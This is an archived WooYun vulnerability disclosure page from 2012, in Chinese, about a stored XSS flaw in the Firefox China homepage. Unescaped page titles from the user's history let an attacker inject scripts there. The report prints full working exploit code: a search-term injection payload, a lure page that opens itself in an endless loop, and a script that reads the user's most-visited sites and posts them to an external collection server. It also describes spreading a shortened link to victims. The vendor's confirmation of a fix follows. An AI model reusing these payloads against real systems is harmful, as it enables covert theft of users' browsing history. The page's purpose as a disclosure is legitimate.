@@ -1,0 +1,338 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		利用火狐主页窃取用户浏览信息。  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		利用火狐主页窃取用户浏览信息。  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/P1n9y_fly">P1n9y_fly</a> 
+</li><li>提交时间：		2012-08-27 15:39</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-08-27：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-08-27：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-08-30：	细节向第三方安全合作伙伴开放<br/>
+									2012-09-06：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-09-16：	细节向普通白帽子公开<br/>
+									2012-10-06：	细节向实习白帽子公开<br/>
+									2012-10-11：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">利用火狐主页窃取用户浏览信息</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">火狐主页，就是我们一打开浏览器，默认跳转到的那个页面。<br />
+<br />
+遇见一件很奇怪的事情，虽然百度搜索那个地方木有XSS但是还是习惯性的去搜索这个关键字，看有没有别人在哪测试。<br />
+<br />
+</p><p class="detail"><a href="../images/27122126ebcfeaa6fe05e910b7f138fc28722c77.png" target="_blank"><img src="../images/27122126ebcfeaa6fe05e910b7f138fc28722c77.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+然后奇怪的事情就发生了：<br />
+<br />
+</p><p class="detail"><a href="../images/2712213219854b26fe76c0e94c7f33b4dcf46e9f.png" target="_blank"><img src="../images/2712213219854b26fe76c0e94c7f33b4dcf46e9f.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+我把浏览器关上，然后再打开结果就被弹了，百思不得其解，最后在这里发现了答案<br />
+<br />
+</p><p class="detail"><a href="../images/271221385d708f2055cea22b4a8e6662b51857ef.png" target="_blank"><img src="../images/271221385d708f2055cea22b4a8e6662b51857ef.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+原来是火狐主页会读取用户的历史记录并显示在网页上，但是恰好网页名字木有过滤。<br />
+<br />
+然后又在想，既然有XSS，又有历史记录，那我们不是可以通过这个获取用户的浏览历史记录么？<br />
+<br />
+将整个页面下载下来后，查看他的源代码。发现其调用的index.js里面有关于获取历史记录的代码<br />
+<br />
+</p><p class="detail"><a href="../images/271221455aedf5f18181aa799afe225945b8acef.png" target="_blank"><img src="../images/271221455aedf5f18181aa799afe225945b8acef.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><pre><code>var HOMEPAGE={<br />
+	is_gecko:((window.Components+&#039;&#039;)==&#039;[object nsXPCComponents]&#039;),hp_xpi:window[&#039;cehp_xpi&#039;]?window[&#039;cehp_xpi&#039;]:&#039;http://download.firefox.com.cn/chinaedition/addons/cehomepage/cehomepage-latest.xpi&#039;,mosts:[],lasts:[],init:function(){<br />
+		if(HOMEPAGE.is_gecko){<br />
+			$(window).load(function(){<br />
+				if(window[&#039;cehomepage&#039;]){<br />
+					var startup=window.cehomepage.startup;<br />
+					if((startup.homepage()==startup.cehomepage()||startup.homepage()==&#039;http://i.firefoxchina.cn/&#039;||startup.homepage()==&#039;about:cehome&#039;)&amp;&amp;startup.page()==1){<br />
+						if(!startup.homepage_changed()||startup.homepage()==startup.cehomepage()||startup.homepage()==&#039;http://i.firefoxchina.cn/&#039;||startup.homepage()==&#039;about:cehome&#039;){<br />
+							$(&quot;#child651&quot;).hide();<br />
+						}else{<br />
+							$(&quot;#child651&quot;).show();<br />
+						}<br />
+					}else{<br />
+						$(&quot;#child651&quot;).show();<br />
+					}<br />
+					HOMEPAGE.writeLog();<br />
+				}else{<br />
+					$(&quot;#mylog&quot;).html(&quot;&lt;a href=&#039;&quot;+HOMEPAGE.hp_xpi+&quot;&#039; style=&#039;margin:50px;display:block;text-align:center;&#039;&gt;要使用此功能，请安装火狐主页扩展！&lt;/a&gt;&quot;);<br />
+				}<br />
+			});<br />
+		}else{<br />
+			$(&quot;#mylog&quot;).html(&quot;&lt;a href=&#039;http://firefox.com.cn&#039; style=&#039;margin:50px;display:block;text-align:center;&#039;&gt;要使用此功能，请使用高速、安全的火狐浏览器！&lt;/a&gt;&quot;);<br />
+		}<br />
+	},writeLog:function(){<br />
+		HOMEPAGE.mosts=window.cehomepage.frequent.query(8);<br />
+			for(var i in HOMEPAGE.mosts){<br />
+				$(&quot;#mylogmost&quot;).append(&quot;&lt;li&gt;&lt;span&gt;&lt;/span&gt;&lt;a href=&#039;&quot;+HOMEPAGE.mosts[i].uri+&quot;&#039; title=&#039;&quot;+(HOMEPAGE.mosts[i].title||HOMEPAGE.mosts[i].uri)+&quot;&#039;&gt;&quot;+(HOMEPAGE.mosts[i].title||HOMEPAGE.mosts[i].uri)+&quot;&lt;/a&gt;&lt;/li&gt;&quot;);<br />
+			}</code></pre><p class='detail'><br />
+<br />
+根据这一段代码我构造出一个相同功能的JS文件，并将历史记录ALERT出来：<br />
+<br />
+</p><pre><code>var testpage={<br />
+  	is_gecko:((window.Components+&#039;&#039;)==&#039;[object nsXPCComponents]&#039;),hp_xpi:window[&#039;cehp_xpi&#039;]?window[&#039;cehp_xpi&#039;]:&#039;http://download.firefox.com.cn/chinaedition/addons/cehomepage/cehomepage-latest.xpi&#039;,mosts:[],lasts:[],init:function(){<br />
+		//alert(&quot;init run&quot;);<br />
+      	if(testpage.is_gecko){<br />
+          	//alert(&quot;is_gecko&quot;);<br />
+          	testpage.writeLog();<br />
+		}else{<br />
+			//alert(&quot;not_gecko&quot;);<br />
+		}<br />
+	},writeLog:function(){<br />
+		testpage.mosts=window.cehomepage.frequent.query(8);<br />
+		for(var i in testpage.mosts){<br />
+			alert(testpage.mosts[i].uri);<br />
+        }<br />
+    }<br />
+} <br />
+//alert(&quot;page run&quot;);<br />
+testpage.init();</code></pre><p class='detail'><br />
+<br />
+弄好了之后我们试一下：<br />
+<br />
+在百度中搜索：&quot;/&gt;&lt;script/src=http://pinqy520.duapp.com/ff.js&gt;&lt;/script&gt;<br />
+<br />
+关闭浏览器后重新打开<br />
+<br />
+</p><p class="detail"><a href="../images/27122156aaef30179928ce4508d429c0a7184ba9.png" target="_blank"><img src="../images/27122156aaef30179928ce4508d429c0a7184ba9.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+发现我的浏览记录果断的被弹出来了。<br />
+<br />
+然后我们就来研究进一步利用，我们构造了一个网页：w.html<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+&lt;head&gt;<br />
+&lt;title&gt;&amp;quot;&amp;gt;&amp;lt;script/src=http://pinqy520.duapp.com/n.js&amp;gt;&amp;lt;/script&amp;gt;&lt;/title&gt;<br />
+&lt;/head&gt;<br />
+&lt;script language=&quot;javascript&quot;&gt;<br />
+	window.open(&quot;http://pinqy520.duapp.com/w.html&quot;);<br />
+&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+然后构造一个JS文件获取用户浏览器历史记录：n.js<br />
+<br />
+<br />
+<br />
+</p><pre><code>function formSubmit(elementValue) {<br />
+    var hextxs = document.createElement(&quot;form&quot;);  <br />
+    //一定要加入到body中！！  <br />
+    document.body.appendChild(hextxs);<br />
+    hextxs.method = &#039;post&#039;;<br />
+	hextxs.action = &#039;http://kocteg.duapp.com/a.php&#039;;<br />
+	hextxs.target = &#039;actionframe&#039;;<br />
+	//创建隐藏表单<br />
+	var riskversion = document.createElement(&quot;input&quot;);<br />
+    riskversion.setAttribute(&quot;name&quot;,&quot;v&quot;);<br />
+    riskversion.setAttribute(&quot;type&quot;,&quot;hidden&quot;);<br />
+    riskversion.setAttribute(&quot;value&quot;,&quot;f&quot;);<br />
+    hextxs.appendChild(riskversion);<br />
+ <br />
+ 	var getcookies = document.createElement(&quot;input&quot;);<br />
+    getcookies.setAttribute(&quot;name&quot;,&quot;c&quot;);<br />
+    getcookies.setAttribute(&quot;type&quot;,&quot;hidden&quot;);<br />
+    getcookies.setAttribute(&quot;value&quot;,elementValue);<br />
+    hextxs.appendChild(getcookies);<br />
+    hextxs.submit();<br />
+}<br />
+var testpage={<br />
+  	is_gecko:((window.Components+&#039;&#039;)==&#039;[object nsXPCComponents]&#039;),hp_xpi:window[&#039;cehp_xpi&#039;]?window[&#039;cehp_xpi&#039;]:&#039;http://download.firefox.com.cn/chinaedition/addons/cehomepage/cehomepage-latest.xpi&#039;,mosts:[],lasts:[],init:function(){<br />
+		//alert(&quot;init run&quot;);<br />
+      	if(testpage.is_gecko){<br />
+          	//alert(&quot;is_gecko&quot;);<br />
+          	testpage.writeLog();<br />
+		}else{<br />
+			//alert(&quot;not_gecko&quot;);<br />
+		}<br />
+	},writeLog:function(){<br />
+		testpage.mosts=window.cehomepage.frequent.query(8);<br />
+      	var t=&quot;&quot;;<br />
+		for(var i in testpage.mosts){<br />
+			//alert(testpage.mosts[i].uri);<br />
+          	//t+=&quot;(&quot;+i+&quot;)url:&quot;+testpage.mosts[i].uri+&quot;;name:&quot;+(testpage.mosts[i].title||testpage.mosts[i].uri)+&quot;;&quot;;<br />
+          	t+=&quot;(&quot;+i+&quot;)url:&quot;+testpage.mosts[i].uri+&quot;;&quot;;<br />
+        }<br />
+      	//alert(t);<br />
+      	formSubmit(t);<br />
+    }<br />
+} <br />
+//alert(&quot;page run&quot;);<br />
+testpage.init();</code></pre><p class='detail'><br />
+<br />
+我们将网址：http://pinqy520.duapp.com/w.html <br />
+<br />
+弄成一个短地址：http://126.am/3wYfI3 <br />
+<br />
+发给别人<br />
+<br />
+点开之后<br />
+<br />
+</p><p class="detail"><a href="../images/27122205faa8cbf1698b2ee596e6b83a3d05be17.png" target="_blank"><img src="../images/27122205faa8cbf1698b2ee596e6b83a3d05be17.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+网页无限被打开<br />
+<br />
+然后我们再加点，一看就知道是恶心广告的东西，一点开，什么都不想，直接关闭火狐。<br />
+<br />
+然后再重新打开的时候，因为我的网页名字被设置成了<br />
+<br />
+&quot;/&gt;&lt;script/src=http://pinqy520.duapp.com/n.js&gt;&lt;/script&gt;<br />
+<br />
+由于火狐主页的那个XSS，就会被调用，然后执行其中的JS代码。用户的浏览信息就被传到我这里来了- -<br />
+<br />
+而因为网页打开次数很多，网页很有可能被加载到最常访问的页面，那一栏- - <br />
+<br />
+这就更悲剧了，每次开开心心的打开火狐浏览器- -亲爱的浏览记录就都跑到我这里来了 = =。<br />
+<br />
+如下图。<br />
+<br />
+</p><p class="detail"><a href="../images/27122211b2802446f2c8357cb27fbb63ee13fc29.png" target="_blank"><img src="../images/27122211b2802446f2c8357cb27fbb63ee13fc29.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+以上。<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">灰常谢谢goderci牛给的那个无限弹窗口导致人想关显示器的建议。。。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过来。。。。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/P1n9y_fly" title="P1n9y_fly">P1n9y_fly</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-011398" title="利用火狐主页窃取用户浏览信息。">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2012-08-27 21:39</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">火狐主页已经修复了这个漏洞，并且上线了。非常感谢P1n9y_fly和乌云网对火狐浏览器的支持。xss漏洞真是防不胜防。希望今后能得到各位继续支持，共建美好而安全的互联网世界。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+																	<p class="detail">2012-08-27：这个漏洞是由于火狐主页显示用户浏览过的网页title时，如遇页面title内容含script标签，会导致远程脚本注入页面，有可能致使页面内其他内容（用户最常\最近访问网址）被第三方网站抓取。这个漏洞类型：xss类，触发方式：用户主动触发，涉及数据：历史纪录。所以我们评定危害等级中级。</p>
+											
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="11398";
+var bugRating="2";
+var myRating="";
+var ratingCount="4";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
